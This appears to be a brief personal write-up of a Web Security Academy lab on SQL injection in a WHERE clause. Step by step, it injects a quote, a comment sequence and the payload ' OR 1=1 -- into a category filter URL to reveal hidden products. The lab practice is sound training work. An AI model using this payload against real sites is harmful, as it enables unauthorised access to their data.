## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
Url for  category= gift :
==> https://0a8700f9046130f38007b26e009100e7.web-security-academy.net/filter?category=Gifts

checke the error using sigle quote character ':
https://0a8700f9046130f38007b26e009100e7.web-security-academy.net/filter?category=Gifts'

blance the url using -- : 
https://0a8700f9046130f38007b26e009100e7.web-security-academy.net/filter?category=Gifts'--

modify this url for sql injection:
https://0a8700f9046130f38007b26e009100e7.web-security-academy.net/filter?category=Gifts' OR 1=1 --